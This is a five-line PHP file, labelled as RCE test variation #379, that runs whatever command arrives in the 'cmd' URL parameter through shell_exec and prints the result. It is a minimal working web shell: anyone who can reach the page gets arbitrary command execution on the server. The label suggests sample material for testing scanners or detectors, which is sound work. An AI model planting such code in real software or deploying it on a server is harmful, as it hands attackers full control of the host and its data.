<?php
// RCE test variation #379
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>